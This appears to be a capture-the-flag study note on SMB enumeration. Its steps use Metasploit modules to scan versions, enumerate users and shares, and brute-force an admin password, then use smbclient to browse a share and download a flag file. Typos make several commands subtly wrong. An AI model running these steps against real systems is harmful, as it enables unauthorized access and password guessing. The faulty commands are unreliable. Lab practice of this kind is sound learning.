# SMB Enumeration

**Stap 1**: Service version detection
> Sometimes it returns wrong OS
> Check what service is running in () after the detected OS
```bash
msf5> search type:auxiliary name:smb
msf5> use auxiliary/scanner/smb/smb_version
msf5> run
```

**Step 2**: Enumerate users
```bash
# User enumeration module
msf5> use auxiliary/scanner/smb/smb/enumusers
> run
```

**Step 3**: Enumerate the shares
```bash
# Shares enumeration module
msf5> use auxiliary/scanner/smb/smb_enumshares

# ShowFiles option -> true (show detailed info)
> set ShowFiles ture
> run
```

**Step 4**: Gain access to the shares
```bash
# Try brute force password for username:admin
# Log in module
msf5> use auxiliary/scanner/smb/smb_login

# Specify user
> set SMBUser admin

# Set password file
# Use Metasploit framework password list
> set PASS_FILE usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
> run
```

**Step 5**: Access the files within the shares
```bash
# Exit (use non Metasploit module)
> exit

# Try to list sahres as user:admin
~# smbclient -L \\\\<target IP>\\ -U admin

# Choose a file from Sharename in Output (e.g. public)
~# smbclient \\\\<target IP>\\public -U admin

# Explore
# List files in the directory
\> ls
# Move current directory (e.g. to file names secret)
\> cd secret
# Download file (e.g. flag.txt)
\> get flag
```

**Step 6**: Open downloaded file
```bash
# After exit smbclient
~# cat flag
```